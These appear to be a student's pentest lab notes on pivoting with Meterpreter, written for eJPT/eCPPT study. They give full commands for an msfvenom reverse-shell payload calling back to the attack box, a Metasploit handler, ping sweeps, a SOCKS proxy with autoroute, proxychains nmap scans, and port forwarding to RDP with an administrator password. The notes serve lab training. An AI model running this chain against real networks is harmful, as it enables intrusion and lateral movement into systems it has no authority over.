
# Pivoting with Meterpreter 101

Essential for eJPT or eCPPT

![Pivoting topology](https://github.com/khansiddique/pentesting-repo-notes/blob/main/Pivot/Images/1.%20Pivoting%20with%20Meterpreter%20101%20-%20YouTube%20%E2%80%94%20Mozilla%20Firefox.png)

### IP Address
```sh

192.168.56.7         # Kali Attack Box VM

192.168.56.19        # Ubuntu
10.0.3.5

10.0.3.4             # Windows Server 12
```
---

### From Kali Box
```sh
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.7 -f elf -o job LPORT=8080
chmod +x job
ssh ubuntu@192.168.56.19
ifconfig
```

> on Kali open another terminal and start up a multi handler

```sh
msfconsole
use exploit/multi/handler
set lhost 0.0.0.0
set lport 8080
set payload linux/x64/meterpreter/reverse_tcp
run
```

---

> Copy the Payload to Ubuntu (ensure you are running this from the folder with the payload on your kali box)
```sh
scp job ubuntu@192.168.56.19:~/         #From Kali box run this
```
---

### From ubuntu

> From ubuntu `ssh` session run this

```sh
chmod +x job
./job
```

> Got a Meterpreter Shell in the metasploit terminal
![meterpreter shell](https://github.com/khansiddique/pentesting-repo-notes/blob/main/Pivot/Images/2%20Pivoting%20with%20Meterpreter%20101%20-%20YouTube%20%E2%80%94%20Mozilla%20Firefox.png)

---
### From Kali box
==============================From Kali box meterpreter session check the interfaces

> run a ping sweep of the path you want to pivot to to enumerate systems on it

```sh
run post/multi/gather/ping_sweep RHOSTS=10.0.3.0/24
```

> we found 10.0.3.4 is a host on the network (target aquired)

> wait for the traps to show/errors and such

> show map to classroom
```sh
background          # the session in meterpreter - example how we are going to use the ubuntu box as a proxy in a way
```

> next we will set up a `socks proxy` using msfconsole

```sh
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run


backgound                   #(note it will already be running in the background)

> check your jobs
jobs

```
---
#### Configure / change in `proxychains` File

> change your /etc/proxychains/config

```sh
sudo nano /etc/proxychains4.conf


[ProxyList]
# uncommante
socks4  127.0.0.1  9050
> Ctrl+x
> y
> enter

```

---

> Configure a `Route Traffic` to 10.0.3.0/24 Network

Easy way (optional)

```sh
# set up post/multi/manage/autoroute
> use post/multi/manage/autoroute
> set SESSION 1
> set SUBNET 10.0.3.0/24
> run
> backgound

#### (note you could also run routes using `run autoroute -s 10.0.3.0/24` in the meterpreter session)
```


----------check your autoroutes in meterpreter

sessions -i

(use the session)

sessions -i 1

run autoroute -p

run autoroute -s 10.0.3.0/24

run autoroute -p



=======use proxy chains to route nmap traffic

proxychains nmap 10.0.3.4 -p3389 -sT -v -Pn



================explain the Windows Server to class



open a new terminal an run this from kali

proxychains nmap 10.0.3.4 -p3389 -sT -v -Pn

noticed that windows has port 3389 open



================From Meterpreter add a port forward

only traffic that is sent to local host 3300 is sent to 3389

portfwd add -l 3300 -p 3389 -r 10.0.3.4



===========now sent an xfreerdp session to the Windows Host

=======our meterpreter session is doing all the routing in combination with proxy chains

=======we can enter the command below from the Kali box to get RDP on Windows

=======================================================(didn't work for me) xfreerdp /v:localhost:3300 /u:administrator /p:Passw0rd

(worked)rdesktop -u administrator -p Passw0rd localhost:3300

```

---

# Reference:
1.  [Pivoting with Meterpreter 101, Into the Code with Danny](https://www.youtube.com/watch?v=UeEizQ2lv-U&t=745s) 
